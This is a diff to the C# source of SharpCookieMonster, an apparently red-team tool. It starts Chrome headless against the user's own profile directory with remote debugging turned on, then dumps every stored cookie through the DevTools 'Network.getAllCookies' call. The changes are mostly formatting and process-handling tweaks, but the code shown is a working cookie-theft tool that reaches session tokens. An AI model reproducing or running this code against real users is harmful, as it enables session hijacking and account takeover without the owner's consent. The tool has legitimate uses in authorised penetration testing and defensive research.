@@ -54,23 +54,27 @@ namespace SharpCookieMonster
                 Console.WriteLine("[*] SharpCookieMonster.exe [url] [chrome-debugging-port] [user-data-dir]");
                 return;
             }
+
             var url = "https://www.google.com";
             if (args.Length >= 1)
             {
                 url = args[0];
                 Console.WriteLine("[*] Accessing site: " + url);
             }
+
             var port = 9142;
             if (args.Length >= 2)
             {
                 port = int.Parse(args[1]);
                 Console.WriteLine("[*] Using chrome debugging port: " + port);
             }
+
             var userdata = Environment.GetEnvironmentVariable("LocalAppData") + @"\Google\Chrome\User Data";
-            if(args.Length == 3)
+            if (args.Length == 3)
             {
                 userdata = args[2];
             }
+
             Console.WriteLine("[*] Using data path: " + userdata);
             var chrome = LaunchChromeHeadless(url, userdata, port);
             if (chrome == null)
@@ -78,6 +82,7 @@ namespace SharpCookieMonster
                 // Ain't running - no point in continuing
                 return;
             }
+
             string cookies;
             try
             {
@@ -87,6 +92,7 @@ namespace SharpCookieMonster
             {
                 Cleanup(chrome);
             }
+
             if (string.IsNullOrEmpty(cookies))
             {
                 Console.WriteLine("[-] No response or could not connect");
@@ -118,53 +124,51 @@ namespace SharpCookieMonster
 
         private static Process LaunchChromeHeadless(string url, string userdata, int port)
         {
-            using (var chrome = new Process())
+            var chrome = new Process();
+            var chromes = Process.GetProcessesByName("chrome");
+            var path = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
+            if (chromes.Length == 0)
             {
-                var chromes = Process.GetProcessesByName("chrome");
-                var path = @"C:\Program Files\Google\Chrome\Application\chrome.exe";
-                if (chromes.Length == 0)
-                {
-                    Console.WriteLine("[*] No chrome processes running, defaulting binary path to: " + path);
-                }
-                else
-                {
-                    // Get the filepath of a running chrome process
-                    path = chromes[0].MainModule?.FileName;
-                }
-                chrome.StartInfo.UseShellExecute = false;
-                chrome.StartInfo.FileName = path;
-                chrome.StartInfo.Arguments = $"\"{url}\" --headless --user-data-dir=\"{userdata}\" --remote-debugging-port={port}";
-                chrome.StartInfo.CreateNoWindow = true;
-                chrome.OutputDataReceived += LogData;
-                chrome.ErrorDataReceived += LogData;
-                chrome.StartInfo.RedirectStandardOutput = true;
-                chrome.StartInfo.RedirectStandardError = true;
-                chrome.Start();
-                chrome.BeginOutputReadLine();
-                chrome.BeginErrorReadLine();
-                var pid = chrome.Id;
-                Thread.Sleep(1000);
-                try
-                {
-                    Process.GetProcessById(pid);
-                }
-                catch (ArgumentException)
-                {
-                    Console.WriteLine("[-] Launched chrome process is not running...will try connecting to port anyway");
-                }
-                Console.WriteLine("[*] Started chrome headless process: " + pid);
-                if (WaitForPort(port)) return chrome;
-                Console.WriteLine("[-] Timed out waiting for debug port to open...");
-                return null;
+                Console.WriteLine("[*] No chrome processes running, defaulting binary path to: " + path);
+            }
+            else
+            {
+                // Get the filepath of a running chrome process
+                path = chromes[0].MainModule?.FileName;
             }
 
+            chrome.StartInfo.UseShellExecute = false;
+            chrome.StartInfo.FileName = path;
+            chrome.StartInfo.Arguments = $"\"{url}\" --headless --user-data-dir=\"{userdata}\" --remote-debugging-port={port}";
+            chrome.StartInfo.CreateNoWindow = true;
+            chrome.OutputDataReceived += LogData;
+            chrome.ErrorDataReceived += LogData;
+            chrome.StartInfo.RedirectStandardOutput = true;
+            chrome.StartInfo.RedirectStandardError = true;
+            chrome.Start();
+            chrome.BeginOutputReadLine();
+            chrome.BeginErrorReadLine();
+            var pid = chrome.Id;
+            Thread.Sleep(1000);
+            try
+            {
+                Process.GetProcessById(pid);
+            }
+            catch (ArgumentException)
+            {
+                Console.WriteLine("[-] Launched chrome process is not running...will try connecting to port anyway");
+            }
+
+            Console.WriteLine("[*] Started chrome headless process: " + pid);
+            if (WaitForPort(port)) return chrome;
+            Console.WriteLine("[-] Timed out waiting for debug port to open...");
+            return null;
         }
 
         private static string GrabCookies(int port)
         {
             using (var webClient = new WebClient())
             {
-
                 var regex = new Regex($"\"webSocketDebuggerUrl\":\\s*\"(ws://localhost:{port}/.*)\"");
                 var response = webClient.DownloadString($"http://localhost:{port}/json");
                 var match = regex.Match(response);
@@ -173,12 +177,12 @@ namespace SharpCookieMonster
                     Console.WriteLine("[-] Could not extract debug URL from chrome debugger service");
                     return null;
                 }
+
                 var debugUrl = match.Groups[1].Value;
                 const string cookiesRequest = "{\"id\": 1, \"method\": \"Network.getAllCookies\"}";
                 Console.WriteLine("[*] Retrieved debug url: " + debugUrl);
                 return WebSocketRequest35(debugUrl, cookiesRequest);
             }
-
         }
 
 
@@ -190,7 +194,7 @@ namespace SharpCookieMonster
                 chrome.ErrorDataReceived -= LogData;
                 chrome.OutputDataReceived -= LogData;
                 Console.WriteLine("[*] Killing process " + chrome.Id);
-                chrome.Kill();
+                Process.GetProcessById(chrome.Id).Kill();
             }
             catch (Exception e)
             {
@@ -213,6 +217,7 @@ namespace SharpCookieMonster
             {
                 Thread.Sleep(500);
             }
+
             return result;
 
             void WebsocketOpened(object sender, EventArgs e)
@@ -249,8 +254,8 @@ namespace SharpCookieMonster
                     }
                 }
             }
+
             return false;
         }
     }
-
 }
